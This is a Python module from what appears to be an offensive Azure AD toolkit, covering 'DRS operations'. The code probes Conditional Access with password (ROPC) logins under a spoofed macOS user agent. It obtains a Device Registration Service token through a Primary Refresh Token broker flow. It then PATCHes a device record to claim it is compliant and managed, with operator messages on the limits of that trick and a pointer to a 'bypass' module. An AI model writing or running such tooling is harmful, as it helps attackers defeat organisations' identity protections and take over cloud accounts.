"""Module 7: DRS operations.

DRS (urn:ms-drs:enterpriseregistration.windows.net) is always CA-exempt -- it returns 50076
(MFA only), never 53003. A DRS token is obtained via the PRT broker flow (Module 3) targeting
the DRS resource.

CRITICAL (documented from testing, gotcha #8): DRS PATCH sets compliance in the DRS enrollment
store, NOT in the AAD device object that CA evaluates. PATCH returns 200 but CA still blocks.
This module performs the PATCH and reports the limitation so the operator doesn't chase it.
"""
import requests

from lib import clients, ua as ua_lib
from lib.logger import logged_session, get as get_log
from lib.oauth import ropc_v1
from lib.util import decode_jwt

DRS_RESOURCE = clients.V1_RESOURCES["drs"]


def run(cfg, eng, args):
    print("[drs] DRS is CA-exempt (expects 50076, MFA only).")
    _probe(cfg)

    # A DRS token needs the MFA/broker flow. Delegate to Module 3 if a PRT is configured.
    if cfg.prt_path:
        from modules import prt_broker
        args.resource = "drs"
        result = prt_broker.run(cfg, eng, args)
        tok = eng.load_token("drs")
        device_id = result.get("deviceid") if isinstance(result, dict) else None
        if tok and device_id:
            _patch_compliance(tok["access_token"], device_id)
        return result

    print("[drs] No PRT configured -- can't complete the MFA broker flow for a DRS token.")
    print("[drs] Run device-reg (or set prt_path), then re-run drs. Alternatively use "
          "`bypass` targeting a platform that yields 50076.")
    return {"token": None}


def _probe(cfg):
    """Confirm DRS CA posture via a quick ROPC (macOS UA). Expect 50076."""
    log = get_log()
    if not cfg.password:
        log.info("[drs] (no password; skipping posture probe)")
        return
    log.info("[drs] Probing DRS CA posture (macOS UA, ROPC)...")
    status, body = ropc_v1(logged_session("drs-probe"), cfg.tenant_id, clients.CLIENTS["office"],
                           cfg.username, cfg.password, DRS_RESOURCE, ua=ua_lib.get("macos"))
    from lib import errors
    code = errors.parse_code(body.get("error_description") or str(body))
    if code:
        print(f"[drs] posture probe: {code} ({errors.explain(code)['meaning']})")
    elif "access_token" in body:
        print("[drs] posture probe: 200 (token directly!)")


def _patch_compliance(drs_token, device_id):
    """PATCH device compliant via the DRS enrollment API. Returns 200 but does NOT reach AAD."""
    log = get_log()
    log.info(f"[drs] Attempting compliance PATCH for device {device_id}...")
    r = logged_session("drs-patch").patch(
        f"https://enterpriseregistration.windows.net/EnrollmentServer/device/{device_id}?api-version=2.0",
        headers={"Authorization": f"Bearer {drs_token}", "Content-Type": "application/json"},
        json={"isCompliant": True, "isManaged": True}, timeout=20)
    print(f"[drs] PATCH status: {r.status_code}")
    if r.status_code in (200, 204):
        print("[drs] *** PATCH accepted (200) BUT: compliance is set in the DRS enrollment store,")
        print("[drs]     NOT in the AAD device object. CA evaluates the AAD object, so it will")
        print("[drs]     STILL block. Compliance must flow through Intune's evaluation pipeline.")
        print("[drs]     (Confirmed limitation -- do not chase this further.)")
    else:
        print(f"[drs] PATCH response: {r.text[:300]}")
    return r.status_code
